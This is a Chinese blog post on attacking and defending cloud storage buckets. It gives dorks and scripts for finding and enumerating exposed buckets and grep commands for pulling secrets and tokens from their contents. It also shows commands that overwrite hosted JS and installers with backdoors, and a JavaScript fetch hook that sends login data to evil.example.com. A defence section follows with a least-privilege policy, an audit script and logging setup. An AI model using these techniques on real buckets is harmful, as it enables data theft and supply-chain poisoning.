
        <h2 class="post-title">
            <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/mliu/p/20521156" title="发布于 2026-06-15 08:20">
    <span role="heading" aria-level="2">一个公开的存储桶，让我摸进了公司的内网：云存储安全攻防实战</span>
    

</a>

        </h2>
        <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<div style="font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, sans-serif; line-height: 1.9; color: rgba(51, 51, 51, 1); max-width: 820px; margin: 0 auto; font-size: 15px">
<p>上周一个客户找到我，说他们收到云厂商的安全告警——某个存储桶在凌晨3点被大量下载，疑似数据泄露。客户很慌，问我："我们的桶设了权限的，怎么还会被拖？"</p>
<p>我笑着说："你设的权限，怕不是'公开可读'那种权限吧？"</p>
<p>一查，果不其然。一个存放日志归档的S3兼容桶，Bucket Policy配置成了<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">Principal: "*"</code>、<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">Effect: "Allow"</code>，配上<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">Action: "s3:GetObject"</code>。这不是锁，这是敞着门让人进。</p>
<p>这种案例我一年能碰上十几起。今天就把云存储桶安全攻防的全流程拆开揉碎了讲清楚——从发现到利用，从利用到防御，一条龙。</p>
<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">第一步：如何发现暴露的存储桶</h2>
<p>云存储桶的发现，主要分两条路：<strong>被动信息收集</strong> 和 <strong>主动探测</strong>。</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">被动收集：Google Hacking + GitHub Dorking</h3>
<p>最省力的方式，让搜索引擎帮你找。</p>
<pre><code class="language-bash"># Google dorking 找公开桶
site:oss.aliyuncs.com intitle:"Index of"
site:s3.amazonaws.com "bucket"
site:blob.core.windows.net intitle:"Index of"

# 找暴露的存储桶URL
"Bucket: " "s3.amazonaws.com"
"Endpoint: " "oss-cn-hangzhou.aliyuncs.com"</code></pre>
<p>GitHub也是重灾区。很多开发者在配置文件中硬编码了桶的访问信息，甚至直接把<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">Bucket Policy</code>贴到了公开仓库。</p>
<pre><code class="language-bash"># GitHub 搜索暴露的云存储配置
"aws_access_key_id" AND "s3" language:yaml
"oss_access_key_id" language:json
"storage_account" AND "connection_string" language:python</code></pre>
<p>前两天我随手一搜，就发现了一个包含阿里云OSS AccessKey的公共仓库——用<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">ali-oss</code> SDK配置了完整的写权限。这种属于<strong>致命级别</strong>的泄露，攻击者拿到后不仅能读数据，还能上传恶意文件。</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">主动探测：我自己常用的工具链</h3>
<p>被动找不完的，主动来扫。</p>
<pre><code class="language-bash"># 安装 S3Scanner 扫描公开桶
pip install s3scanner

# 批量检测桶列表
s3scanner scan --bucket-file buckets.txt --out found.txt

# buckets.txt 内容示例
dev-backup.company.com
prod-logs.company.com
test-assets.company.com
data-analytics.company.com</code></pre>
<p>这里有个关键技巧：<strong>桶命名模式预测</strong>。一旦你拿到一个公司的一个桶名，按命名规律可以推出其他桶。</p>
<pre><code class="language-python">import boto3
import re

# 根据已知桶名预测模式
known_bucket = "prod-logs-company"
patterns = [
    known_bucket,
    known_bucket.replace("prod", "dev"),
    known_bucket.replace("prod", "test"),
    known_bucket.replace("logs", "backup"),
    known_bucket.replace("logs", "data"),
    f"{known_bucket}-archive",
    f"{known_bucket}-bak",
]

s3 = boto3.client('s3')
for bucket in patterns:
    try:
        response = s3.list_objects_v2(Bucket=bucket, MaxKeys=1)
        print(f"[+] 可读: {bucket} - {response.get('Contents', [])}")
    except Exception as e:
        code = e.response['Error']['Code']
        if code == 'NoSuchBucket':
            print(f"[-] 不存在: {bucket}")
        elif code == 'AccessDenied':
            print(f"[*] 存在但无权限: {bucket}")</code></pre>
<p>跑一轮下来，经常能扫到意外惊喜——Dev环境的备份桶、测试数据桶，权限往往比Prod松散得多。</p>
<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">第二步：捅开之后的骚操作</h2>
<p>找到可读的桶只是开始，真正的价值在于<strong>能从桶里挖到什么</strong>。</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">数据侦察：目录漫游的艺术</h3>
<pre><code class="language-bash"># 递归列出桶内所有文件
aws s3 ls s3://exposed-bucket --recursive --human-readable

# 按大小排序找出"大鱼"
aws s3 ls s3://exposed-bucket --recursive | sort -k3 -rn | head -20

# 搜索敏感关键词
aws s3 ls s3://exposed-bucket --recursive | grep -iE "\.(pem|key|env|config|json|sql|csv|xlsx|pdf|dump)"</code></pre>
<p>一次实战中，我在一个"测试"桶里翻出了以下文件：</p>
<ul style="margin: 8px 0; padding-left: 24px; line-height: 1.8">
<li><code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">config/staging.env</code> — 内含数据库连接串和Redis密码</li>
<li><code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">backup/db_dump_20260501.sql</code> — 完整的用户表数据</li>
<li><code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">deploy/ssh_key_staging.pem</code> — 测试服务器SSH密钥</li>
<li><code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">logs/app/2026/04/</code> — 应用日志，含用户Token和API请求</li>
</ul>
<p><strong>一条凭证通向一个内网。</strong> 拿到那个<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">.pem</code>文件后，我直接SSH到了他们的Staging服务器——而那条Staging环境，竟然和生产环境在同一VPC下。从公开桶到内网漫游，整个过程不到40分钟。</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">日志中的金矿</h3>
<p>千万别小看日志。很多人觉得日志"没什么价值"，加密程度也是最松的。</p>
<pre><code class="language-bash"># 从日志中提取API Token
grep -oP '"token":\s*"[^"]+"' app-2026-*.log | sort -u

# 提取IP白名单
grep -oP '"client_ip":\s*"[^"]+"' access.log.* | sort -u

# 提取用户操作记录
grep "ERROR" error.log.* | grep -i "unauthorized\|forbidden\|permission"</code></pre>
<p>我见过最离谱的一次，一个桶里存了<strong>半年的Nginx访问日志</strong>，里面记满了API请求的完整URL——包括query string里的Token。等于攻击者拿到了一把通往所有内部API的万能钥匙。</p>
<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">第三步：写入权限才是真正的噩梦</h2>
<p>比可读桶更可怕的是<strong>可写桶</strong>。</p>
<pre><code class="language-bash"># 检查桶的写入权限
echo "test" &gt; /tmp/test.txt
aws s3 cp /tmp/test.txt s3://exposed-bucket/test_write_permission.txt

# 如果能写入，尝试覆盖关键文件
aws s3 cp /tmp/malicious.js s3://exposed-bucket/static/js/app.js</code></pre>
<p>可写桶的攻击路径：</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">供应链投毒</h3>
<p>如果你的桶被用来托管前端静态资源，攻击者上传一个恶意JS文件：</p>
<pre><code class="language-javascript">// 看似正常的埋点代码，实际窃取用户凭证
(function() {
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        // 偷偷记录请求中的敏感信息
        if (args[0].includes('/api/login') || args[0].includes('/token')) {
            fetch('https://evil.example.com/steal', {
                method: 'POST',
                body: JSON.stringify({url: args[0], body: args[1]?.body})
            });
        }
        return originalFetch.apply(this, args);
    };
})();</code></pre>
<p>如果用户访问的页面加载了这个JS，所有登录信息都会被劫持。而这种攻击最可怕的地方在于——<strong>你完全不知道它在发生</strong>，直到有用户报告异常。</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">恶意文件上传导致RCE</h3>
<p>更直接的攻击：上传伪装成更新包的恶意文件。</p>
<pre><code class="language-bash"># 覆盖OTA更新包
aws s3 cp /tmp/backdoor.sh s3://exposed-bucket/updates/v2.1.3/update.sh
# 覆盖客户端下载的安装程序
aws s3 cp /tmp/trojan.msi s3://exposed-bucket/downloads/installer-v3.0.msi</code></pre>
<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">第四步：防御指南（说人话版）</h2>
<p>讲了这么多攻击，必须把防守也说清楚。下面是我给客户的<strong>三道防线</strong>：</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">一、最小权限原则 —— 最便宜也最有效的防御</h3>
<pre><code class="language-json">{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "Bool": {"aws:SecureTransport": "false"}
      }
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789:role/app-server"
      },
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::my-bucket/app-data/*"
    }
  ]
}</code></pre>
<p>关键点：</p>
<ul style="margin: 8px 0; padding-left: 24px; line-height: 1.8">
<li><strong>永远不要</strong>用<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">"Principal": "*"</code>配合<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">"Effect": "Allow"</code></li>
<li>用<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">Deny</code>兜底策略：先拒绝所有人，再按需放行</li>
<li>限定<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">SourceIP</code>和<code style="background: rgba(245, 245, 245, 1); padding: 1px 5px; border-radius: 3px; font-size: 0.9em; color: rgba(214, 51, 132, 1)">SecureTransport</code></li>
<li>使用<strong>预签名URL</strong>（Presigned URL）替代公开访问</li>
</ul>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">二、自动化扫描 —— 别等人告诉你桶暴露了</h3>
<pre><code class="language-python">#!/usr/bin/env python3
"""云存储桶安全巡检脚本"""
import boto3
import json
from botocore.exceptions import ClientError

def check_bucket_public_access(bucket_name):
    """检查存储桶是否公开可访问"""
    s3 = boto3.client('s3')
    results = {'bucket': bucket_name, 'risks': []}
    
    # 1. 检查Bucket Policy
    try:
        policy = s3.get_bucket_policy(Bucket=bucket_name)
        policy_doc = json.loads(policy['Policy'])
        for statement in policy_doc.get('Statement', []):
            principal = statement.get('Principal', {})
            if principal in ('*', {'AWS': '*'}):
                results['risks'].append({
                    'type': 'PUBLIC_POLICY',
                    'detail': f"Statement allows public: {statement.get('Effect')}"
                })
    except ClientError as e:
        if e.response['Error']['Code'] != 'NoSuchBucketPolicy':
            results['risks'].append({'type': 'POLICY_CHECK_FAILED', 'detail': str(e)})
    
    # 2. 检查ACL
    try:
        acl = s3.get_bucket_acl(Bucket=bucket_name)
        for grant in acl.get('Grants', []):
            grantee = grant.get('Grantee', {})
            if grantee.get('URI', '') == 'http://acs.amazonaws.com/groups/global/AllUsers':
                results['risks'].append({
                    'type': 'PUBLIC_ACL',
                    'detail': f"Public {grant['Permission']} via ACL"
                })
    except Exception as e:
        results['risks'].append({'type': 'ACL_FAILED', 'detail': str(e)})
    
    # 3. 检查Block Public Access设置
    try:
        bpa = s3.get_public_access_block(Bucket=bucket_name)
        for k, v in bpa['PublicAccessBlockConfiguration'].items():
            if not v:
                results['risks'].append({
                    'type': 'BPA_DISABLED',
                    'detail': f"{k} is disabled"
                })
    except ClientError:
        results['risks'].append({'type': 'BPA_NOT_CONFIGURED'})
    
    return results

# 扫描所有桶
s3 = boto3.client('s3')
buckets = s3.list_buckets()['Buckets']
for b in buckets:
    result = check_bucket_public_access(b['Name'])
    if result['risks']:
        print(f"[!] {b['Name']}: {len(result['risks'])} 个风险")
        for r in result['risks']:
            print(f"    {r['type']}: {r['detail']}")</code></pre>
<p>把这脚本挂到CI/CD或者定时任务里，每天跑一次。发现风险直接飞书/钉钉告警。</p>
<h3 style="font-size: 17px; color: rgba(51, 51, 51, 1); margin-top: 24px; margin-bottom: 8px; font-weight: 600">三、日志审计与异常检测</h3>
<pre><code class="language-bash"># 开启S3访问日志（发到独立的审计桶）
aws s3api put-bucket-logging \
  --bucket prod-data \
  --bucket-logging-status '{
    "LoggingEnabled": {
      "TargetBucket": "audit-logs-prod",
      "TargetPrefix": "s3-access/prod-data/"
    }
  }'

# 分析异常访问模式
# 1. 来自非预期地域的访问
# 2. 下载量突然暴增（数据拖取）
# 3. 非工作时间的大量访问
# 4. 批量枚举对象（403连发）</code></pre>
<p>我在一个客户的审计日志里发现，某个桶在凌晨的下载量是白天的10倍，来源IP来自东欧。客户一查，果然是被Web爬虫抓到了公开桶。</p>
<h2 style="font-size: 20px; color: rgba(26, 26, 46, 1); margin-top: 32px; margin-bottom: 12px; border-left: 3px solid rgba(255, 107, 53, 1); padding-left: 10px">写在最后</h2>
<p>云存储桶安全的核心问题从来不是技术——<strong>是意识</strong>。</p>
<p>每次我处理这类事件，90%的场景都是：开发图方便、运维没复查、安全没覆盖到。一条错误的Bucket Policy，几个字符的问题，带来的后果可能是整个公司数据资产暴露。</p>
<p>给所有安全从业者和运维一句实在话：</p>
<blockquote style="border-left: 3px solid rgba(255, 107, 53, 1); padding: 10px 16px; background: rgba(250, 250, 250, 1); margin: 16px 0; color: rgba(85, 85, 85, 1)"><strong>每天花5分钟检查一下你们公司的存储桶权限，比你买一百万的WAF都管用。</strong></blockquote>
<p>别等到云厂商的告警邮件发到你CEO邮箱，再去查是哪条Policy出了问题。</p>
